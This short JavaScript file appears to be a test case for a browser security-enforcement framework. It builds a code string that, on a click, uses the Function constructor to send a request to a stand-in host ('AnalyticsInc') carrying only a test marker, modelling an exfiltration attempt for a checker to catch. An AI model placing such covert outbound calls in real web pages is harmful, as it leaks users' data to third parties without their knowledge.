// exfil_test_onclick2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onclick2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("click", JAM.call(Function, null, [exp]), false)
